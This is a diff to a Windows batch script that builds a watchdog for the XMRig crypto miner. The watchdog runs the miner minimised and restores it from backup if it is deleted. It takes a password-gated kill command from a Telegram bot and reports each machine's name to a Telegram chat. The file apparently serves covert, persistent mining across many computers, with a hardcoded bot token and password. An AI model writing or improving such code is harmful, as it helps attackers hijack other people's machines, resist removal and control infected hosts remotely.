@@ -138,12 +138,12 @@ set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
 set "TG_CHAT_ID=8112985977"
 set "KILL_PASSWORD=mykillpassword123"
 
-REM === Enhanced Watchdog with Telegram & Backup ===
+REM === Singleton Watchdog - One Instance Only ===
 (
 echo @echo off
 echo setlocal enabledelayedexpansion
 echo set "DIAG=%%TEMP%%\watchdog.log"
-echo set "MUTEX=%%TEMP%%\xmrig_watchdog.lock"
+echo set "MUTEX=%%TEMP%%\xmrig_singleton.lock"
 echo set "XMRIG=%%~dp0xmrig.exe"
 echo set "BACKUP=%%~dp0backup"
 echo set "TG_TOKEN=%TG_TOKEN%"
@@ -151,37 +151,44 @@ echo set "TG_CHAT=%TG_CHAT_ID%"
 echo set "KILL_PASS=%KILL_PASSWORD%"
 echo set /a "STATS=0"
 echo.
-echo [*] Watchdog started at %%date%% %%time%% ^> "%%DIAG%%"
+echo [*] Singleton watchdog started at %%date%% %%time%% ^> "%%DIAG%%"
 echo.
 echo :loop
+echo   REM Check for existing instances
+echo   tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe" ^>nul
+echo   if %%errorlevel%% equ 0 (
+echo     echo [✓] XMRig already running - monitoring only ^>^> "%%DIAG%%"
+echo     timeout /t 10 ^>nul
+echo     goto loop
+echo   )
+echo.
+echo   REM Check for kill command
+echo   curl -s "https://api.telegram.org/bot%%TG_TOKEN%%/getUpdates?offset=-1" ^> "%%TEMP%%\upd.json" 2^>nul
+echo   findstr /c:"/kill %%KILL_PASS%%" "%%TEMP%%\upd.json" ^>nul ^&^& (
+echo     echo [!] Kill command received, stopping all instances... ^>^> "%%DIAG%%"
+echo     taskkill /F /IM xmrig.exe ^>nul 2^>^&1
+echo     timeout /t 5 ^>nul
+echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" -d "chat_id=%%TG_CHAT%%" -d "text=💀 All miners killed on %%COMPUTERNAME%%"
+echo     goto loop
+echo   )
+echo.
+echo   REM Check if miner exists, restore if missing
 echo   if not exist "%%XMRIG%%" (
 echo     echo [!] Miner missing, restoring from backup... ^>^> "%%DIAG%%"
 echo     xcopy /Y /Q "%%BACKUP%%\*" "%%~dp0" ^>nul
 echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" -d "chat_id=%%TG_CHAT%%" -d "text=🔄 Miner restored on %%COMPUTERNAME%% at %%date%% %%time%%"
 echo   )
 echo.
-echo   REM Kill switch check
-echo   curl -s "https://api.telegram.org/bot%%TG_TOKEN%%/getUpdates?offset=-1" ^> "%%TEMP%%\upd.json"
-echo   findstr /c:"/kill %%KILL_PASS%%" "%%TEMP%%\upd.json" ^>nul ^&^& (
-echo     echo [!] Kill command received, stopping miner... ^>^> "%%DIAG%%"
-echo     taskkill /F /IM xmrig.exe ^>nul 2^>^&1
-echo     del "%%MUTEX%%" 2^>nul
-echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" -d "chat_id=%%TG_CHAT%%" -d "text=💀 Miner killed on %%COMPUTERNAME%%"
-echo     exit /b
-echo   )
-echo.
-echo   REM Miner health check
+echo   REM Start new instance only if none running
 echo   tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe" ^>nul
-echo   if errorlevel 1 (
-echo     echo [!] Miner not running, starting... ^>^> "%%DIAG%%"
+echo   if %%errorlevel%% neq 0 (
+echo     echo [!] No XMRig running, starting new instance... ^>^> "%%DIAG%%"
 echo     start "" /min "%%XMRIG%%" --config="%%~dp0config.json"
-echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" -d "chat_id=%%TG_CHAT%%" -d "text=⚠️ XMRig restarted on %%COMPUTERNAME%% at %%date%% %%time%%"
+echo     curl -s -X POST "https://api.telegram.org/bot%%TG_TOKEN%%/sendMessage" -d "chat_id=%%TG_CHAT%%" -d "text=🚀 New XMRig instance started on %%COMPUTERNAME%% at %%date%% %%time%%"
 echo     set /a STATS+=1
-echo   ) else (
-echo     rem Miner running normally
 echo   )
 echo.
-echo   timeout /t 30 ^>nul
+echo   timeout /t 15 ^>nul
 echo   goto loop
 ) > "%DEST%\run_watchdog.bat"
 
